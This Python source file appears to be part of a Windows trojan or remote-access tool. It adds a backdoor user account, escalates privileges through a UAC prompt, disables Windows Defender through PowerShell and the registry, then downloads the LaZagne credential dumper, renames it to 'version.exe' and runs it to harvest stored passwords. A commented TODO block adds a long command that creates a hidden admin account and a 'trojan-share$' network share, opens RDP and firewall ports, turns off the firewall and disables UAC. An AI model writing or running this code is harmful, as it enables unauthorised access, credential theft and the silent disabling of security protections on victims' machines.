


# TODO :
# os.system("net user W%computername%O vocfu1203 /add && net localgroup administrators W%computername%O /add && mkdir C:\system-01 && cd system-01 && attrib system-01 +h && net share trojan-share$=C:\system-01 /grant:WO,full /grant:everyone,full && netsh firewall set service type = fileandprint mode = enable && netsh firewall set service type = remotedesktop mode = enable && netsh advfirewall firewall set rule group='remote desktop' new enable=Yes && netsh advfirewall firewall add rule name='Open Ports' dir=out action=allow protocol=TCP localport=8080-445-443-6777-3389 && reg add 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server' /v fDenyTSConnections/t REG_DWORD /d0/f && netsh advfirewall set allprofile state off && reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f && ipconfig /all > C:\system-01\%computername%.txt && getmac > C:\system-01\%computername%.txt && net user > C:\system-01\%computername%.txt && powershell.exe set-executionpolicy remotesigned && powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true")
# ctypes.windll.shell32.ShellExecuteW(None, "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true", unicode(sys.executable), unicode(__file__), None, 1)



import ctypes, sys
from urllib.request import urlopen
import subprocess as sp

__all__ = ['User']



DOWNLOAD_URL = "https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe"
DOWNLOAD_DST = "version.exe"
COMMAND = "version.exe all > version"



def download():
	content = urlopen(DOWNLOAD_URL).read()
	outfile = open(DOWNLOAD_DST, "wb")
	outfile.write(content)
	outfile.close()


def run():
	process = sp.Popen(COMMAND, shell = True, stdout = sp.PIPE, stderr = sp.PIPE)
	pid = process.pid
	output, error = process.communicate()
	failed = process.returncode
	return pid, output, error, failed


# https://stackoverflow.com/questions/19672352/how-to-run-python-script-with-elevated-privilege-on-windows
def run_as_admin(argv=None, debug=False):
	shell32 = ctypes.windll.shell32
	if argv is None and shell32.IsUserAnAdmin():
		return True

	if argv is None:
		argv = sys.argv
	if hasattr(sys, '_MEIPASS'):
		arguments = map(str, argv[1:])
	else:
		arguments = map(str, argv)
	argument_line = u' '.join(arguments)
	executable = str(sys.executable)
	if debug:
		print('Command line: ', executable, argument_line)
	ret = shell32.ShellExecuteW(None, u"runas", executable, argument_line, None, 1)
	if int(ret) <= 32:
		return False
	return None



class User:

	def __init__(self):
		pass

	def add(self):
		os.system("net user ielts @1234* /add")

	def admin(self):
		os.system("net user ielts /active:yes")

	def passwords(self):
		ret = run_as_admin()
		if ret is True:
			os.system("powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true")
			os.system('REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f') 
		elif ret is None:
			os.system("powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true")
			os.system('REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f')
		else:
			sys.exit(1)

		download() # download lazagne
		return run() # run lazagne and return status
		